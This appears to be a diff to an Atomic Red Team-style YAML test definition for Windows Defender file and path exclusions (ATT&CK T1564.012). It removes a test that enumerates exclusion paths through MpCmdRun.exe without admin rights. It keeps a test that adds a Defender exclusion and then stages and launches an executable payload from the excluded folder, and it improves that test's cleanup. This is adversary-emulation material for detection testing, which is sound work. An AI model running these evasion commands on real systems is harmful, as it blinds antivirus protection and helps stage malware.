@@ -1,67 +1,7 @@
 attack_technique: T1564.012
 display_name: 'Hide Artifacts: File/Path Exclusions'
 atomic_tests:
-- name: Enumerate Windows Defender exclusion paths via MpCmdRun.exe without administrative privileges
-  auto_generated_guid: 0cd6bef2-9087-4354-9571-6b73e0507309
-  description: |
-    Determines whether a given path is excluded from Microsoft Defender scanning by invoking the
-    signed Microsoft binary MpCmdRun.exe with a custom scan (-ScanType 3) against a deliberately
-    invalid path containing a pipe character. Because Defender evaluates its exclusion list before
-    attempting to scan, an excluded directory reports that scanning "was skipped", while a
-    directory that is not excluded fails with hr = 0x80508023.
-
-    This does not require administrative privileges, unlike Get-MpPreference, which returns
-    "N/A: Must be an administrator to view exclusions" for unprivileged users. An adversary can
-    therefore map Defender's blind spots as a low-privileged user in order to select a location in
-    which to stage file-based payloads.
-
-    Upon successful execution, the excluded path returns "was skipped" and the non-excluded path
-    returns hr = 0x80508023.
-
-    Reference: https://blog.fndsec.net/2024/10/04/uncovering-exclusion-paths-in-microsoft-defender-a-security-research-insight/
-  supported_platforms:
-  - windows
-  input_arguments:
-    excluded_path:
-      description: Directory that is expected to be present in the Defender exclusion list.
-      type: path
-      default: C:\Temp\ARTExclusionTest
-    non_excluded_path:
-      description: Directory that is expected to be absent from the Defender exclusion list, used as a control.
-      type: path
-      default: C:\Temp\ARTNotExcluded
-    mpcmdrun_path:
-      description: Path to the Microsoft Defender command line utility.
-      type: path
-      default: C:\Program Files\Windows Defender\MpCmdRun.exe
-  dependency_executor_name: powershell
-  dependencies:
-  - description: |
-      MpCmdRun.exe must be present on the system.
-    prereq_command: |
-      if (Test-Path "#{mpcmdrun_path}") {exit 0} else {exit 1}
-    get_prereq_command: |
-      Write-Host "MpCmdRun.exe is a native Microsoft Defender component and cannot be installed. It is not present at #{mpcmdrun_path}."
-  - description: |
-      An excluded directory (#{excluded_path}) and a non-excluded control directory (#{non_excluded_path}) must exist. Adding a Defender exclusion requires administrative privileges and fails when Tamper Protection is enabled.
-    prereq_command: |
-      if (((Get-MpPreference).ExclusionPath -contains "#{excluded_path}") -and (Test-Path "#{non_excluded_path}")) {exit 0} else {exit 1}
-    get_prereq_command: |
-      New-Item -ItemType Directory "#{excluded_path}" -Force | Out-Null
-      New-Item -ItemType Directory "#{non_excluded_path}" -Force | Out-Null
-      Add-MpPreference -ExclusionPath "#{excluded_path}"
-  executor:
-    command: |
-      & "#{mpcmdrun_path}" -Scan -ScanType 3 -File "#{excluded_path}\|*"
-      & "#{mpcmdrun_path}" -Scan -ScanType 3 -File "#{non_excluded_path}\|*"
-    cleanup_command: |
-      Remove-MpPreference -ExclusionPath "#{excluded_path}" -ErrorAction SilentlyContinue
-      Remove-Item "#{excluded_path}" -Recurse -Force -ErrorAction SilentlyContinue
-      Remove-Item "#{non_excluded_path}" -Recurse -Force -ErrorAction SilentlyContinue
-    name: powershell
-    elevation_required: false
 - name: Stage and execute a payload from a Windows Defender excluded path
-  auto_generated_guid: d67623ab-b6ef-4370-a2b3-8bfdfc6d9315
   description: |
     Writes an executable payload into a directory that is excluded from Microsoft Defender scanning
     and executes it from that location. Rather than modifying tool settings to create a new
@@ -77,7 +17,8 @@ atomic_tests:
   - windows
   input_arguments:
     excluded_path:
-      description: Directory that is present in the Defender exclusion list, used to stage the payload.
+      description: >
+        Directory that is present in the Defender exclusion list, used to stage the payload.
       type: path
       default: C:\Temp\ARTExclusionTest
     payload_source:
@@ -91,20 +32,35 @@ atomic_tests:
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      An excluded directory (#{excluded_path}) must exist and be present in the Defender exclusion list. Adding a Defender exclusion requires administrative privileges and fails when Tamper Protection is enabled.
+      An excluded directory (#{excluded_path}) must exist and be present in the Defender
+      exclusion list. Adding a Defender exclusion requires administrative privileges and fails
+      when Tamper Protection is enabled.
     prereq_command: |
       if ((Get-MpPreference).ExclusionPath -contains "#{excluded_path}") {exit 0} else {exit 1}
     get_prereq_command: |
+      $markerPath = Join-Path "#{excluded_path}" ".art-created-defender-exclusion"
       New-Item -ItemType Directory "#{excluded_path}" -Force | Out-Null
-      Add-MpPreference -ExclusionPath "#{excluded_path}"
+      Add-MpPreference -ExclusionPath "#{excluded_path}" -ErrorAction Stop
+      New-Item -ItemType File $markerPath -Force | Out-Null
+  - description: |
+      The payload source (#{payload_source}) must exist on disk.
+    prereq_command: |
+      if (Test-Path "#{payload_source}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      Write-Host "The payload source must already exist at #{payload_source}."
   executor:
     command: |
       Copy-Item "#{payload_source}" -Destination "#{excluded_path}\#{payload_name}" -Force
       Start-Process "#{excluded_path}\#{payload_name}"
     cleanup_command: |
-      Stop-Process -Name ([System.IO.Path]::GetFileNameWithoutExtension("#{payload_name}")) -Force -ErrorAction SilentlyContinue
+      $payloadProcess = [System.IO.Path]::GetFileNameWithoutExtension("#{payload_name}")
+      Stop-Process -Name $payloadProcess -Force -ErrorAction SilentlyContinue
       Remove-Item "#{excluded_path}\#{payload_name}" -Force -ErrorAction SilentlyContinue
-      Remove-MpPreference -ExclusionPath "#{excluded_path}" -ErrorAction SilentlyContinue
-      Remove-Item "#{excluded_path}" -Recurse -Force -ErrorAction SilentlyContinue
+      $markerPath = Join-Path "#{excluded_path}" ".art-created-defender-exclusion"
+      if (Test-Path $markerPath) {
+        Remove-Item $markerPath -Force -ErrorAction SilentlyContinue
+        Remove-MpPreference -ExclusionPath "#{excluded_path}" -ErrorAction SilentlyContinue
+        Remove-Item "#{excluded_path}" -Force -ErrorAction SilentlyContinue
+      }
     name: powershell
     elevation_required: false
